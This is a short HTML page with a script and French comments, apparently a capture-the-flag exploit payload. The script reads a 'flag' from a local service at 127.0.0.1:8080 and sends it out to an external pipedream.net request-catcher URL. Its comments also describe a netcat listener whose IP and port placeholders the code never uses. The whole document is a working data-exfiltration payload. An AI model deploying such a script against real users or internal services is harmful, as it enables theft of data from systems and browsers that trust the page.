<!DOCTYPE html>
<html>
<body>
<script>
(async () => {
    try {
        // Étape 1 : récupérer la flag depuis le serveur local du CTF
        const flagResponse = await fetch("http://127.0.0.1:8080/flag");
        const flag = await flagResponse.text();

        // Étape 2 : envoyer la flag à ton listener netcat
        const listenerIP = "TON_IP";  // ton IP publique
        const listenerPort = "PORT";  // port où tu as lancé nc -lvp PORT
        await fetch(`https://eot0ky10b33bx61.m.pipedream.net/?flag=` + encodeURIComponent(flag));

        console.log("Flag envoyée sur le listener !");
    } catch (err) {
        console.error("Erreur :", err);
    }
})();
</script>
</body>
</html>
